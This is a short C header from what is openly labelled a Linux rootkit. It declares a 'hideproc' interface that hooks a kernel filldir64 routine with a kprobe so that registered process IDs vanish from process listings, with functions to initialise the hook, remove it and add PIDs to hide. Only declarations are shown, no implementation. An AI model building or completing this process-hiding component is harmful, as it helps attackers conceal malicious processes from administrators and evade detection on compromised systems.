#include <linux/kprobes.h>

#ifndef HIDEPROC_H
#define HIDEPROC_H

#define PIDS_MAX 512

// Internals

int _check_pid_already_registred(short pid);
void _update_child_pid(void);
int _handler_proc_filldir64(struct kprobe *p, struct pt_regs *regs);

// API for rootkit

int hideproc_init(void);
void hideproc_exit(void);
void hideproc_add_pid(short pid);

#endif